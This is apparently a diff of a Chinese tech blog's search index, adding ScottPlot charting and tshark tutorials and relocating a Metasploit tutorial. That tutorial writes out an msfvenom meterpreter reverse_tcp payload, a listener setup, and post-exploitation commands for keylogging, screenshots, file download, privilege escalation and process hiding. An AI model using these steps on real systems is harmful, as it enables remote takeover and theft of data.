+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.DotNet.Interactive.Formatting;</span><br><span class="line">Formatter.Register(<span class="keyword">typeof</span>(ScottPlot.Plot), (p, w) =&gt; </span><br><span class="line">    w.Write(((ScottPlot.Plot)p).GetPngHtml(<span class="number">400</span>, <span class="number">300</span>)), HtmlFormatter.MimeType);</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="載入-CSV-資料"><a class="header-anchor" href="#載入-CSV-資料"></a>載入 CSV 資料</h1>
+<p>可參考這篇 <a href="/2024/05/05/NetDataFrame/" title="使用 DataFrame 操作資料">DataFrame</a> 載入 <a href="test.csv">📥 CSV 資料</a></p>
+<h1 id="建立擴充方法"><a class="header-anchor" href="#建立擴充方法"></a>建立擴充方法</h1>
+<p>使用此擴充方法取得特定 Column 資料</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">double</span>[] <span class="title">GetColumn</span>(<span class="params"><span class="keyword">this</span> DataFrame df, <span class="built_in">string</span> column</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> Enumerable.Range(<span class="number">0</span>, (<span class="built_in">int</span>)df.Rows.Count).Select(x =&gt; Convert.ToDouble(df[column][x])).ToArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="使用-SignalXY-繪圖"><a class="header-anchor" href="#使用-SignalXY-繪圖"></a>使用 SignalXY 繪圖</h1>
+<p>分析各分類分佈狀態</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 計算資料筆數</span></span><br><span class="line"><span class="built_in">int</span>[] rowIndex = Enumerable.Range(<span class="number">0</span>, (<span class="built_in">int</span>)df.Rows.Count).ToArray();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Duration 欄</span></span><br><span class="line"><span class="built_in">double</span>[] durationsY = df.GetColumn(<span class="string">&quot;Duration&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll1 = myPlot.Add.SignalXY(rowIndex, durationsY);</span><br><span class="line">sigAll1.LegendText = <span class="string">&quot;Duration&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Pulse 欄</span></span><br><span class="line"><span class="built_in">double</span>[] pulseY = df.GetColumn(<span class="string">&quot;Pulse&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll2 = myPlot.Add.SignalXY(rowIndex, pulseY);</span><br><span class="line">sigAll2.LegendText = <span class="string">&quot;Pulse&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Maxpulse 欄</span></span><br><span class="line"><span class="built_in">double</span>[] maxpulseY = df.GetColumn(<span class="string">&quot;Maxpulse&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll3 = myPlot.Add.SignalXY(rowIndex, maxpulseY);</span><br><span class="line">sigAll3.LegendText = <span class="string">&quot;Maxpulse&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Calories 欄</span></span><br><span class="line"><span class="built_in">double</span>[] caloriesY = df.GetColumn(<span class="string">&quot;Calories&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll4 = myPlot.Add.SignalXY(rowIndex, caloriesY);</span><br><span class="line">sigAll4.LegendText = <span class="string">&quot;Calories&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Legend 位置</span></span><br><span class="line">myPlot.Legend.Alignment = ScottPlot.Alignment.UpperRight;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
+<!-- myPlot1.GetImage(400, 300).SaveWebp("SignalXY.webp"); -->
+<p><img src="SignalXY.webp" alt="SignalXY"></p>
+<h1 id="使用-Scatter-繪圖"><a class="header-anchor" href="#使用-Scatter-繪圖"></a>使用 Scatter 繪圖</h1>
+<p>使用「Duration」作為 x 軸，使用「Calories」作為 y 軸，分析兩者關聯性</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Scatter</span></span><br><span class="line">Scatter scatter = myPlot.Add.Scatter(durationsY, caloriesY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除線條</span></span><br><span class="line">scatter.LineWidth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
+<p><img src="Scatter1.webp" alt="Scatter1"></p>
+<p>使用「Duration」作為 x 軸，使用「Maxpulse」作為 y 軸，分析兩者關聯性</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Scatter</span></span><br><span class="line">Scatter scatter = myPlot.Add.Scatter(durationsY, maxpulseY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除線條</span></span><br><span class="line">scatter.LineWidth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
+<p><img src="Scatter2.webp" alt="Scatter2"></p>
+<h1 id="使用-Bars-繪圖"><a class="header-anchor" href="#使用-Bars-繪圖"></a>使用 Bars 繪圖</h1>
+<p>繪製 Duration 資料分佈狀態，分析 Duration 頻率</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Duration 欄</span></span><br><span class="line"><span class="built_in">double</span>[] durationsY = df.GetColumn(<span class="string">&quot;Duration&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直方圖分箱數</span></span><br><span class="line"><span class="built_in">int</span> binCount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 獲取直方圖數據</span></span><br><span class="line">ScottPlot.Statistics.Histogram hist = ScottPlot.Statistics.Histogram.WithBinCount(binCount, durationsY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Bars</span></span><br><span class="line">BarPlot bar = myPlot.Add.Bars(hist.Bins, hist.GetProbability());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Y 軸刻度</span></span><br><span class="line">myPlot.Axes.Left.TickGenerator = <span class="keyword">new</span> ScottPlot.TickGenerators.NumericFixedInterval(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Bars 的顏色與寬度</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">var</span> bar <span class="keyword">in</span> bar.Bars)</span><br><span class="line">&#123;</span><br><span class="line">    bar.LineColor = ScottPlot.Color.FromColor(System.Drawing.Color.Blue);</span><br><span class="line">    bar.LineWidth = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">//bar.Size = hist.FirstBinSize * 0.8;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 繪製機率曲線</span></span><br><span class="line">ProbabilityDensity pd = <span class="keyword">new</span>(durationsY);</span><br><span class="line"><span class="built_in">double</span>[] xs = Generate.Range(durationsY.Min(), durationsY.Max(), <span class="number">1</span>);</span><br><span class="line"><span class="built_in">double</span> sumBins = hist.Bins.Select(x =&gt; pd.GetY(x)).Sum();</span><br><span class="line"><span class="built_in">double</span>[] ys = pd.GetYs(xs, <span class="number">1.0</span> / sumBins);</span><br><span class="line"></span><br><span class="line">Scatter curve = myPlot.Add.ScatterLine(xs, ys);</span><br><span class="line">curve.LineWidth = <span class="number">2</span>;</span><br><span class="line">curve.LineColor = Colors.Black;</span><br><span class="line">curve.LinePattern = LinePattern.DenselyDashed;</span><br><span class="line"></span><br><span class="line">myPlot.Axes.Margins(bottom: <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
+<p><img src="Histogram.webp" alt="Histogram"></p>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://scottplot.net/quickstart/notebook/">scottplot</a></li>
+<li><a href="https://www.w3schools.com/python/pandas/pandas_plotting.asp">pandas plotting</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>.Net</category>
+      </categories>
+      <tags>
+        <tag>.Net</tag>
+        <tag>Polyglot Notebooks</tag>
+        <tag>ScottPlot</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何解析 XML 資料</title>
     <url>/2024/02/04/NetXmlParse/</url>
     <content><![CDATA[<h1 id="宣告-XML-資料"><a class="header-anchor" href="#宣告-XML-資料"></a>宣告 XML 資料</h1>
@@ -1840,6 +1869,7 @@ dotnet-dump collect --process-id 1902 -->
       <tags>
         <tag>XML</tag>
         <tag>.Net</tag>
+        <tag>Polyglot Notebooks</tag>
       </tags>
   </entry>
   <entry>
@@ -1949,9 +1979,9 @@ db.create_all() -->
         <category>Python</category>
       </categories>
       <tags>
+        <tag>FontForge</tag>
         <tag>Font</tag>
         <tag>Python</tag>
-        <tag>FontForge</tag>
       </tags>
   </entry>
   <entry>
@@ -2315,6 +2345,76 @@ k6 run --stage 30s:10 test.js;
       </tags>
   </entry>
   <entry>
+    <title>Metasploit 基本操作</title>
+    <url>/2024/06/01/ToolSecurityMetasploit/</url>
+    <content><![CDATA[<div class="note danger"><p>⚠️ 請注意，本範例僅供學習參考，請遵守相關法令，產生之行為與後果將由使用者自行負責</p>
+</div>
+<!-- 設定檔位置: ~/.msf4 -->
+<h1 id="開啟-Metasploit-Console"><a class="header-anchor" href="#開啟-Metasploit-Console"></a>開啟 Metasploit Console</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line"><span class="comment"># 資料庫設定: /home/[user]/.msf4/database.yml</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新設定</span></span><br><span class="line">msfdb reinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立資料庫連線</span></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止資料庫連線</span></span><br><span class="line">msfdb stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
+<h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新 nmap</span></span><br><span class="line">db_nmap --script-updatedb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 script 掃描漏洞</span></span><br><span class="line"><span class="comment"># script 路徑: /usr/share/nmap/scripts</span></span><br><span class="line">db_nmap -sV --script [漏洞script檔] [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
+<h1 id="模組查詢"><a class="header-anchor" href="#模組查詢"></a>模組查詢</h1>
+<p>⭐ 更新可用模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
+<p>⭐ 顯示可用模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用於繞過防毒軟體或安全防護機制的技術</span></span><br><span class="line">show evasion</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於取得會話後，在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br></pre></td></tr></table></figure>
+<p>⭐ 查找模組</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
+<p>⭐ 模組使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h1 id="滲透操作"><a class="header-anchor" href="#滲透操作"></a>滲透操作</h1>
+<p>⭐ 常用會話接口介紹</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">接口</th>
+<th style="text-align:left">說明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">command shell</td>
+<td style="text-align:left">獲得一個命令行界面，允許攻擊者在目標系統上執行命令</td>
+</tr>
+<tr>
+<td style="text-align:left">meterpreter</td>
+<td style="text-align:left">一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等</td>
+</tr>
+<tr>
+<td style="text-align:left">vnc</td>
+<td style="text-align:left">在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面</td>
+</tr>
+</tbody>
+</table>
+<p>⭐ 創建 meterpreter 會話接口的 payload :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
+<p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>⭐ 遠端執行 meterpreter payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+<h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
+<p>獲得會話接口後常用命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.metasploit.com/">metasploit</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Tool</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Security</tag>
+        <tag>Metasploit</tag>
+        <tag>Nmap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>K6 壓測可視化</title>
     <url>/2025/04/02/ToolK6Monitor/</url>
     <content><![CDATA[<h1 id="安裝-InfluxDB-儲存壓測資料"><a class="header-anchor" href="#安裝-InfluxDB-儲存壓測資料"></a>安裝 InfluxDB 儲存壓測資料</h1>
@@ -2384,74 +2484,6 @@ $env:K6_INFLUXDB_TOKEN='[初始TOKEN]' ;
         <tag>K6</tag>
         <tag>InfluxDB</tag>
         <tag>Grafana</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit 基本操作</title>
-    <url>/2024/06/01/ToolSecurityMetasploit/</url>
-    <content><![CDATA[<!-- 設定檔位置: ~/.msf4 -->
-<h1 id="開啟-Metasploit-Console"><a class="header-anchor" href="#開啟-Metasploit-Console"></a>開啟 Metasploit Console</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line"><span class="comment"># 資料庫設定: /home/[user]/.msf4/database.yml</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立資料庫連線</span></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止資料庫連線</span></span><br><span class="line">msfdb stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
-<h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新 nmap</span></span><br><span class="line">db_nmap --script-updatedb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 script 掃描漏洞</span></span><br><span class="line"><span class="comment"># script 路徑: /usr/share/nmap/scripts</span></span><br><span class="line">db_nmap -sV --script [漏洞script檔] [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
-<h1 id="模組查詢"><a class="header-anchor" href="#模組查詢"></a>模組查詢</h1>
-<p>⭐ 更新可用模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
-<p>⭐ 顯示可用模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於取得會話後，在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br></pre></td></tr></table></figure>
-<p>⭐ 查找模組</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
-<p>⭐ 模組使用</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h1 id="滲透操作"><a class="header-anchor" href="#滲透操作"></a>滲透操作</h1>
-<p>⭐ 常用會話接口介紹</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">接口</th>
-<th style="text-align:left">說明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">command shell</td>
-<td style="text-align:left">獲得一個命令行界面，允許攻擊者在目標系統上執行命令</td>
-</tr>
-<tr>
-<td style="text-align:left">meterpreter</td>
-<td style="text-align:left">一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等</td>
-</tr>
-<tr>
-<td style="text-align:left">vnc</td>
-<td style="text-align:left">在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面</td>
-</tr>
-</tbody>
-</table>
-<p>⭐ 創建 meterpreter 會話接口的 payload :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
-<p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p>⭐ 遠端執行 meterpreter payload</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
-<h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
-<p>獲得會話接口後常用命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.metasploit.com/">metasploit</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Tool</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Security</tag>
-        <tag>Metasploit</tag>
-        <tag>Nmap</tag>
       </tags>
   </entry>
   <entry>
@@ -2587,6 +2619,53 @@ $env:K6_INFLUXDB_TOKEN='[初始TOKEN]' ;
       <tags>
         <tag>Tool</tag>
         <tag>Whistle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tshark 基本操作</title>
+    <url>/2021/10/23/ToolWiresharkCommand/</url>
+    <content><![CDATA[<h1 id="安裝-Wireshark"><a class="header-anchor" href="#安裝-Wireshark"></a>安裝 Wireshark</h1>
+<p>tshark 是 Wireshark 的命令行界面，因此需安裝 Wireshark</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">scoop install extras/wireshark</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="查詢版本"><a class="header-anchor" href="#查詢版本"></a>查詢版本</h1>
+<p>查詢目前 tshark 版本</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-v</span></span><br></pre></td></tr></table></figure>
+<h1 id="網路介面"><a class="header-anchor" href="#網路介面"></a>網路介面</h1>
+<p>查詢網路介面</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-D</span></span><br></pre></td></tr></table></figure>
+<h1 id="擷取封包"><a class="header-anchor" href="#擷取封包"></a>擷取封包</h1>
+<p>擷取封包資料，並匯出 pcap</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-i</span> [網路介面編號] <span class="literal">-b</span> duration:[每隔幾秒執行] <span class="literal">-c</span> [指定擷取筆數] <span class="literal">-w</span> [匯出檔案].pcap</span><br></pre></td></tr></table></figure>
+<p>讀取 pcap 檔案</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tshark <span class="literal">-r</span> [匯出檔案].pcap</span><br></pre></td></tr></table></figure>
+<p>顯示指定欄位，來源 IP、目的 IP 、 TCP port</p>
